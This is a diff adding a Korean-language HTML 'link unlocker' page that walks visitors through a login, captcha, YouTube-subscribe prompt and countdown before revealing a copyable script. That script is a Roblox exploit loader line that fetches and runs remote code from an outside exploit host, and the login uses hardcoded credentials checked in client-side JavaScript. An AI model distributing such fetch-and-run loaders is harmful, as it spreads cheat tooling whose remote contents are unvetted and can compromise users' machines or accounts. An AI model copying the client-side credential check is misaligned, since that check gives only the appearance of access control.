@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>LINK UNLOCKER</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@600;700;900&display=swap');
+    body {margin:0;background:#0f0f1a;font-family:'Inter',sans-serif;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;text-transform:uppercase;}
+    .box {background:#171730;border-radius:16px;padding:45px 50px;max-width:460px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.8);text-align:center;}
+    h1 {font-size:32px;margin:0 0 15px;color:#00ff9d;letter-spacing:2px;}
+    .desc {color:#aaa;font-size:16px;margin-bottom:35px;letter-spacing:1px;}
+    .captcha-box {background:#1e1e38;border-radius:12px;padding:25px;margin:25px 0;}
+    canvas {background:#000;border-radius:8px;margin:15px 0;box-shadow:0 4px 20px rgba(0,0,0,0.7);}
+    input[type=text], input[type=password] {width:100%;padding:16px;font-size:20px;text-align:center;background:#111;color:#fff;border:2px solid #444;border-radius:8px;margin:10px 0;letter-spacing:3px;text-transform:uppercase;box-sizing:border-box;}
+    button {width:100%;padding:18px;margin:12px 0;font-size:20px;font-weight:900;border:none;border-radius:10px;cursor:pointer;letter-spacing:1px;}
+    .btn-verify.active {background:#00ff9d;color:#000;}
+    .subscribe-box {display:none;background:#1e1e38;border-radius:12px;padding:30px;margin:30px 0;}
+    .subscribe-btn {background:#ff0050 !important;color:#fff !important;font-size:22px !important;padding:20px !important;}
+    .confirm-btn {background:#00ff9d;color:#000;margin-top:20px;}
+    .timer-area {margin:40px 0;font-size:72px;font-weight:900;color:#00ff9d;display:none;letter-spacing:3px;}
+    .progress {height:12px;background:#333;border-radius:6px;overflow:hidden;margin:25px 0;}
+    .bar {height:100%;width:0;background:#00ff9d;transition:width .2s;}
+    .final {margin-top:40px;font-size:22px;display:none;}
+    .final pre {background:#000;padding:20px;border-radius:10px;overflow-x:auto;color:#00ff9d;font-family:monospace;font-size:16px;word-break:break-all;}
+    .copy-btn {background:#00ff9d;color:#000;margin-top:15px;}
+    .refresh {color:#888;font-size:15px;cursor:pointer;margin-top:10px;}
+    .login-box {background:#1e1e38;border-radius:12px;padding:30px;margin:25px 0;}
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h1>LINK UNLOCK</h1>
+    <p class="desc">대문자로 로그인 후 스크립트 받기</p>
+
+    <!-- 0단계: 대문자 로그인 -->
+    <div id="login-step">
+      <div class="login-box">
+        <p style="font-size:20px;margin:20px 0;">대문자로만 입력 가능</p>
+        <input type="text" id="username" placeholder="아이디 (대문자)" autocomplete="off">
+        <input type="password" id="password" placeholder="비밀번호 (대문자)" autocomplete="off">
+        <button class="btn-verify active" id="login-btn">LOGIN</button>
+        <p id="login-msg" style="margin:10px 0;color:#ff6b6b;height:24px;font-weight:bold;"></p>
+      </div>
+    </div>
+
+    <!-- 나머지 단계들 (기존과 동일) -->
+    <div id="captcha-step" style="display:none;">
+      <div class="captcha-box">
+        <canvas id="captcha" width="260" height="90"></canvas>
+        <div class="refresh" onclick="generateCaptcha()">새로고침</div>
+        <input type="text" id="captcha-input" placeholder="위 문자 입력">
+        <button class="btn-verify" id="verify-btn">확인하기</button>
+        <p id="msg" style="margin:10px 0;color:#ff6b6b;height:24px;font-weight:bold;"></p>
+      </div>
+    </div>
+
+    <div class="subscribe-box" id="subscribe-step">
+      <p style="font-size:20px;margin:20px 0;">구독하고 스크립트 받기!</p>
+      <button class="subscribe-btn" id="youtube-btn">유튜브 구독하러 가기</button>
+      <button class="confirm-btn" id="confirm-btn">구독 완료했어요! 계속하기</button>
+    </div>
+
+    <div id="timer-area">
+      <div class="timer-area" id="timer">5</div>
+      <div class="progress"><div class="bar" id="bar"></div></div>
+      <button id="getlink-btn" disabled>잠금 해제 중... (5초)</button>
+    </div>
+
+    <div class="final" id="final">
+      <p>모든 미션 완료!</p>
+      <pre id="script-code">loadstring(game:HttpGet'https://exploit.plus/Loader')()</pre>
+      <button class="copy-btn" onclick="copyScript()">복사하기</button>
+      <p style="margin-top:15px;color:#00ff9d;font-size:14px;" id="copy-status"></p>
+    </div>
+  </div>
+
+<script>
+  // 대문자 전용 로그인 계정 (원하면 여기만 수정)
+  const VALID_USERNAME = "ADMIN";
+  const VALID_PASSWORD = "QP2025";
+
+  // 입력 필드 실시간 대문자 변환
+  document.getElementById('username').addEventListener('input', function() {
+    this.value = this.value.toUpperCase();
+  });
+  document.getElementById('password').addEventListener('input', function() {
+    this.value = this.value.toUpperCase();
+  });
+
+  // 로그인 처리
+  document.getElementById('login-btn').onclick = () => {
+    const user = document.getElementById('username').value.trim();
+    const pass = document.getElementById('password').value;
+
+    if (user === VALID_USERNAME && pass === VALID_PASSWORD) {
+      document.getElementById('login-msg').style.color = '#00ff9d';
+      document.getElementById('login-msg').textContent = 'LOGIN SUCCESS';
+      setTimeout(() => {
+        document.getElementById('login-step').style.display = 'none';
+        document.getElementById('captcha-step').style.display = 'block';
+      }, 800);
+    } else {
+      document.getElementById('login-msg').textContent = 'INVALID ID OR PASSWORD';
+    }
+  };
+
+  // 엔터키 로그인
+  document.getElementById('password').addEventListener('keyup', e => {
+    if (e.key === 'Enter') document.getElementById('login-btn').click();
+  });
+
+  // 캡챠 및 나머지 기능 (완전히 동일)
+  const canvas = document.getElementById('captcha');
+  const ctx = canvas.getContext('2d');
+  let captchaText = '';
+
+  function generateCaptcha() {
+    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+    captchaText = '';
+    for (let i = 0; i < 6; i++) captchaText += chars.charAt(Math.floor(Math.random() * chars.length));
+
+    ctx.fillStyle = '#000'; ctx.fillRect(0,0,canvas.width,canvas.height);
+    for (let i = 0; i < 10; i++) {
+      ctx.strokeStyle = `rgba(100,100,100,0.3)`;
+      ctx.lineWidth = 2;
+      ctx.beginPath();
+      ctx.moveTo(Math.random()*canvas.width, Math.random()*canvas.height);
+      ctx.lineTo(Math.random()*canvas.width, Math.random()*canvas.height);
+      ctx.stroke();
+    }
+    for (let i = 0; i < 6; i++) {
+      ctx.font = `${Math.random()*20+36}px Arial`;
+      ctx.fillStyle = `hsl(${i*60}, 100%, 60%)`;
+      ctx.save();
+      ctx.translate(30 + i*38, 55);
+      ctx.rotate((Math.random()-0.5)*0.6);
+      ctx.fillText(captchaText[i], 0, 0);
+      ctx.restore();
+    }
+  }
+  generateCaptcha();
+
+  document.getElementById('verify-btn').onclick = () => {
+    if (document.getElementById('captcha-input').value.toUpperCase() === captchaText) {
+      document.getElementById('msg').style.color = '#00ff9d';
+      document.getElementById('msg').textContent = 'SUCCESS';
+      setTimeout(() => {
+        document.getElementById('captcha-step').style.display = 'none';
+        document.getElementById('subscribe-step').style.display = 'block';
+      }, 800);
+    } else {
+      document.getElementById('msg').textContent = 'WRONG! TRY AGAIN';
+      generateCaptcha();
+      document.getElementById('captcha-input').value = '';
+    }
+  };
+
+  document.getElementById('captcha-input').addEventListener('keyup', e => {
+    if (e.key === 'Enter') document.getElementById('verify-btn').click();
+  });
+
+  document.getElementById('youtube-btn').onclick = () => {
+    window.open('https://www.youtube.com/@ScriptsQP', '_blank');
+  };
+
+  document.getElementById('confirm-btn').onclick = () => {
+    document.getElementById('subscribe-step').style.display = 'none';
+    document.getElementById('timer-area').style.display = 'block';
+    startTimer();
+  };
+
+  function startTimer() {
+    let sec = 5;
+    const timer = document.getElementById('timer');
+    const bar = document.getElementById('bar');
+
+    const iv = setInterval(() => {
+      sec--;
+      timer.textContent = sec;
+      bar.style.width = ((5-sec)/5*100) + '%';
+
+      if (sec <= 0) {
+        clearInterval(iv);
+        document.getElementById('timer-area').style.display = 'none';
+        document.getElementById('final').style.display = 'block';
+      }
+    }, 1000);
+  }
+
+  function copyScript() {
+    const code = document.getElementById('script-code').textContent;
+    navigator.clipboard.writeText(code).then(() => {
+      document.getElementById('copy-status').textContent = 'COPIED!';
+      setTimeout(() => document.getElementById('copy-status').textContent = '', 2000);
+    });
+  }
+</script>
+</body>
+</html>
